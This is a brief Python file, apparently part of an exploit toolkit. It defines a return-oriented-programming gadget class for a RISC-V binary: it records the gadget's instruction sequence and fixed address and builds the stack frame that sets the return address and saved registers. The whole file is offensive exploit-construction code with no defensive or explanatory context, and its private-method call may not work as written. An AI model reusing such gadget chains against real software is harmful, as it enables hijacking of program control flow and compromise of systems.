from rop_gadgets import ROP_Gadget

class MovA0_S0(ROP_Gadget):
    '''
    ld ra, 0x38(sp)
    mv a0, s0
    ld s0, 0x30(sp)
    ld s1, 0x28(sp)
    ld s2, 0x20(sp)
    ld s3, 0x18(sp)
    ld s4, 0x10(sp)
    ld s5, 0x8(sp)
    ld s6, 0(sp)
    addi sp, sp, 0x40
    '''
    def __init__(self):
        super().__init__(0x1484c, 0x40)

    def construct_frame(self, ra=0, s0=0, s1=0):
        data = [0, s1, s0, ra]
        self.__set_stack_frame(data)